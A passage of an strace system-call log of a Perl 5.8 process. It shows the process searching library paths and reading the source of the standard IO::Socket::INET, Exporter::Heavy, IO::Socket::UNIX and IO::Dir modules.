$r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
9764  07:29:45.396774 _llseek(6, 6698, [6698], SEEK_SET) = 0
9764  07:29:45.396790 _llseek(6, 0, [6698], SEEK_CUR) = 0
9764  07:29:45.396801 close(6)          = 0
9764  07:29:45.396830 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.396872 stat64("/etc/perl/IO/Socket/INET.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.396904 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.396935 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.396949 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.396962 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.396977 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.396989 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397002 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.397015 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397028 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.397042 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
9764  07:29:45.397063 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.397078 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.397093 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.397110 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
9764  07:29:45.397477 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397493 stat64("/etc/perl/Exporter/Heavy.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397507 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397520 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397534 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397547 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397562 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397574 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397588 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397600 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397613 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397626 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbffa2f5c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397640 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbffa304c) = -1 ENOENT (No such file or directory)
9764  07:29:45.397653 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
9764  07:29:45.397675 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
9764  07:29:45.397689 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa2d68) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.397700 _llseek(8, 0, [0], SEEK_CUR) = 0
9764  07:29:45.397718 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
9764  07:29:45.409800 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
9764  07:29:45.410047 brk(0x829c000)    = 0x829c000
9764  07:29:45.410313 read(8, "", 4096) = 0
9764  07:29:45.410328 close(8)          = 0
9764  07:29:45.411461 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
9764  07:29:45.411898 _llseek(6, 6496, [6496], SEEK_SET) = 0
9764  07:29:45.411914 _llseek(6, 0, [6496], SEEK_CUR) = 0
9764  07:29:45.411925 close(6)          = 0
9764  07:29:45.411999 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.412064 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.412080 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.412094 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.412109 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.412123 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.412151 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.412163 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.412177 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.412189 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.412203 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.412216 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
9764  07:29:45.412237 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.412253 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.412264 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.412280 brk(0x82bd000)    = 0x82bd000
9764  07:29:45.412296 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
9764  07:29:45.413245 _llseek(6, 1386, [1386], SEEK_SET) = 0
9764  07:29:45.429427 _llseek(6, 0, [1386], SEEK_CUR) = 0
9764  07:29:45.429455 close(6)          = 0
9764  07:29:45.429538 stat64("/etc/perl/IO/Dir.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.429556 stat64("/etc/perl/IO/Dir.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.429570 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.429583 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.429597 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.429610 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.429624 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.429641 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.429654 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.429667 stat64("/usr/share/perl5/IO/Dir.pm", 0xbffa340c) = -1 ENOENT (No such file or directory)
9764  07:29:45.429680 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbffa34fc) = -1 ENOENT (No such file or directory)
9764  07:29:45.429692 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
9764  07:29:45.429714 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
9764  07:29:45.429729 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbffa3218) = -1 ENOTTY (Inappropriate ioctl for device)
9764  07:29:45.429741 _llseek(6, 0, [0], SEEK_CUR) = 0
9764  07:29:45.429761 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    